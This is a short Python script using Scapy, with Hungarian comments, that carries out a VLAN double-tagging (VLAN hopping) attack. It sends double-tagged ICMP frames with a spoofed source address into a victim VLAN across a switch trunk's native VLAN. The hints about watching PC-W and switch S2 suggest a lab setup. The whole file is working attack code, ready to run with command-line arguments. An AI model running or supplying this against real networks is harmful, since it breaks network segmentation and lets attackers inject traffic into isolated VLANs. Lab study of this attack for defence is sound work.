#!/usr/bin/env python3
"""Külső tag = a trunk natív VLAN-ja (a trunkon lecsúszik), belső tag = cél-VLAN.
A második switch a BELSŐ taget értelmezi → a keret bejut a másik VLAN-ba.
Egyirányú támadás: a válasz nem tud visszajutni.

Futtatás: sudo python3 vlan_double_tag.py eth0 10.20.20.10 [outer] [inner]
"""
import sys
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    target = sys.argv[2] if len(sys.argv) > 2 else "10.20.20.10"
    outer = int(sys.argv[3]) if len(sys.argv) > 3 else 1     # trunk natív VLAN-ja
    inner = int(sys.argv[4]) if len(sys.argv) > 4 else 20    # áldozat VLAN-ja
    conf.iface = iface
    frame = (Ether(dst="aa:aa:aa:aa:aa:aa", src=conf.iface.mac) /
             Dot1Q(vlan=outer) / Dot1Q(vlan=inner) /
             IP(src="10.10.10.66", dst=target) / ICMP(type=8, id=0x1234))
    print(f"[*] Double-tagged keretek: outer={outer}, inner={inner}, dst={target}")
    print("[*] Figyeld a PC-W-t (VLAN 20) tcpdumppal az ICMP echo request-et.")
    for _ in range(10):
        sendp(frame, verbose=0)
    print("[!] Kész. Az S2-n a 'show interfaces trunk' megmutatja a natív VLAN-t.")

if __name__ == "__main__":
    main()
